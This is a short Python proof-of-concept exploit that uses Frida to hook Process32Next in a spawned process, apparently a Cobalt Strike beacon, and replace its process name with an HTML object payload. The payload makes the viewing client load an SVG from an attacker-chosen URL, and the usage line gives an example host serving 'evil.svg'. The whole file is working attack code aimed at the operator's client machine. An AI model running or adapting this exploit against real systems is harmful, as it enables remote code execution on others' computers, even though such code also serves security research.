import frida
import time
import sys

def processInject(target, url):
    print('[+] Spawning target process')
    
    pid=frida.spawn(target)
    session=frida.attach(pid)
    
    frida_script ='''  
    var payload="<html><object classid='org.apache.batik.swing.JSVGCanvas'><param name='URI' value='USER_PAYLOAD'></param></object>"  
    var pProcess32Next = Module.findExportByName("kernel32.dll", "Process32Next")

    Interceptor.attach(pProcess32Next, {
        onEnter: function(args) {
            this.pPROCESSENTRY32 = args[1];
        },
        onLeave: function(retval) {
            if(this.pPROCESSENTRY32.add(44).readAnsiString() == "beacon.exe") {
                send("[!] Found beacon, injecting payload");
                this.pPROCESSENTRY32.add(44).writeAnsiString(payload);
            }
        }
    })
    '''.replace("USER_PAYLOAD",url)

    script = session.create_script(frida_script)
    script.load()
    frida.resume(pid)
    #make sure payload is triggered on client
    print("[+] Waiting for 100 seconds")
    time.sleep(100)
    frida.kill(pid)
    print('[+] Done! Killed beacon process.')
    exit(0)

if __name__=='__main__':
    if len(sys.argv) == 3:
        processInject(sys.argv[1], sys.argv[2])
    else:  
        print("[-] Incorrect Usage!\n\nExample: python3 {} beacon.exe http://10.10.10.2:8080/evil.svg".format(sys.argv[0]))